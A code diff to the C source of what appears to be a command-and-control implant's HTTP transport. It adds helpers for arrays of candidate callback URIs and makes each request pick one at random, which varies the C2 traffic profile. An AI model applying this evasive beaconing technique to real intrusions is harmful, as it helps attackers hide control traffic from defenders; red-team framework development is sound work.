@@ -339,13 +339,50 @@ PWSTR generate_headers(HttpTransportContext* ctx, HttpConnection* conn)
  * is included with any outbound URI that is associated with the request, and hence allows
  * for the URI to change between get and post requests based on a C2 profile.
  */
+/*!
+ * @brief Free the candidate URI array on an options struct.
+ */
+void http_options_free_uris(HttpRequestOptions* options)
+{
+	if (options->uris != NULL)
+	{
+		for (UINT i = 0; i < options->uri_count; ++i)
+		{
+			SAFE_FREE(options->uris[i]);
+		}
+		free(options->uris);
+		options->uris = NULL;
+	}
+	options->uri_count = 0;
+}
+
+/*!
+ * @brief Replace the options' candidate URIs with a single base URI.
+ * @details Used for the default/base transport URL (derived from C2_URL),
+ *          which has no profile-supplied candidate list.
+ */
+void http_options_set_single_uri(HttpRequestOptions* options, PCWSTR uri)
+{
+	http_options_free_uris(options);
+	if (uri == NULL)
+	{
+		return;
+	}
+	options->uris = (PWSTR*)calloc(1, sizeof(PWSTR));
+	if (options->uris == NULL)
+	{
+		return;
+	}
+	options->uris[0] = _wcsdup(uri);
+	options->uri_count = 1;
+}
+
 PWSTR generate_uri(HttpTransportContext* ctx, HttpConnection* conn)
 {
-	PWCHAR baseUri = ctx->default_options.uri;
-	if (conn->options.uri)
-	{
-		baseUri = conn->options.uri;
-	}
+	// Pick one of the connection's candidate URIs at random; fall back to the
+	// transport's default/base URI when the verb config has none.
+	HttpRequestOptions* opts = conn->options.uri_count > 0 ? &conn->options : &ctx->default_options;
+	PWCHAR baseUri = opts->uri_count > 0 ? opts->uris[rand() % opts->uri_count] : NULL;
 
 	// if we don't have a UUID yet we are going to assume that it's in the base URI.
 	// If we do have a URI specified for this connection, we need to parse it. But only
